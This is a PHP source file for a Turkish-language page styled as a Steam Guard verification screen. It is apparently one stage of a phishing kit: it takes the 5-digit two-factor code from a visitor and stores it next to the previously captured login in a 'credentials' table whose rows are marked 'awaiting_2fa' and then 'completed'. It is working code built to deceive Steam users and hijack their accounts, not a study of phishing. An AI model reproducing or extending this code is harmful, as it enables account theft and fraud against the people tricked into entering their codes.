
<?php
require_once 'config.php';

// Check if user has a valid session
if (!isset($_SESSION['username'])) {
    header("Location: index.php");
    exit;
}

$username = $_SESSION['username'];
$csrf_token = generate_csrf_token();

// Process Steam Guard form submission
$success_message = '';
$error_message = '';

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['guardCode'])) {
    // Validate CSRF token
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        $error_message = "Güvenlik doğrulaması başarısız oldu. Lütfen tekrar deneyin.";
    } else {
        $guardCode = sanitize_input($_POST['guardCode']);
        
        if (strlen($guardCode) === 5) {
            // Update the credential in the database
            $stmt = $pdo->prepare("UPDATE credentials SET steamguard = ?, status = 'completed' WHERE username = ? AND status = 'awaiting_2fa' ORDER BY id DESC LIMIT 1");
            
            if ($stmt->execute([$guardCode, $username])) {
                $success_message = "Giriş başarılı! Yönlendiriliyorsunuz...";
                
                // Clear session after successful completion
                $_SESSION = array();
                
                // Set redirect with JavaScript
                echo "<script>
                    setTimeout(function() {
                        window.location.href = 'index.php';
                    }, 1500);
                </script>";
            } else {
                $error_message = "Bir hata oluştu. Lütfen tekrar deneyin.";
            }
        } else {
            $error_message = "Geçersiz kod formatı. Lütfen 5 haneli kodu girin.";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Steam Guard Doğrulama</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #171a21;
            color: white;
            font-family: Arial, sans-serif;
        }
    </style>
</head>
<body>
    <div class="min-h-screen flex flex-col items-center justify-center p-4">
        <div class="bg-[#1b2838]/70 backdrop-blur-sm p-8 rounded-md shadow-lg max-w-md w-full">
            <div class="text-center mb-6">
                <div class="h-16 w-16 bg-blue-400 rounded-full flex items-center justify-center mx-auto mb-4">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-8 h-8">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
                    </svg>
                </div>
                <h1 class="text-xl font-bold text-white">Steam Guard Doğrulama</h1>
                <p class="text-sm text-white/70 mt-2">
                    E-posta adresinize gönderilen veya Steam Authenticator mobil uygulamasındaki kodu girin.
                </p>
            </div>
            
            <?php if ($success_message): ?>
            <div class="bg-green-500/20 border border-green-500 text-green-200 px-4 py-3 rounded mb-4">
                <?php echo $success_message; ?>
            </div>
            <?php endif; ?>
            
            <?php if ($error_message): ?>
            <div class="bg-red-500/20 border border-red-500 text-red-200 px-4 py-3 rounded mb-4">
                <?php echo $error_message; ?>
            </div>
            <?php endif; ?>
            
            <form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" class="space-y-6">
                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                
                <div class="space-y-2">
                    <label class="text-sm font-medium text-white/70">
                        Steam Guard Kodu
                    </label>
                    <input
                        name="guardCode"
                        class="bg-[#32353c] border-0 text-white text-center tracking-widest text-xl h-12 w-full rounded px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
                        placeholder="XXXXX"
                        maxlength="5"
                        <?php echo ($success_message) ? 'disabled' : ''; ?>
                    >
                </div>
                
                <button 
                    type="submit" 
                    class="w-full h-10 bg-blue-400 hover:bg-blue-500 text-white rounded px-4 py-2 font-medium transition-colors"
                    <?php echo ($success_message) ? 'disabled' : ''; ?>
                >
                    <?php echo ($success_message) ? 'Doğrulandı!' : 'Gönder'; ?>
                </button>
                
                <div class="pt-4 border-t border-[#32353c]">
                    <p class="text-xs text-white/60 text-center">
                        Steam Guard kodunuzu bulamıyor musunuz? <br>
                        <a href="#" class="text-blue-400 hover:underline">Yardım için buraya tıklayın</a>
                    </p>
                </div>
            </form>
        </div>
    </div>
</body>
</html>
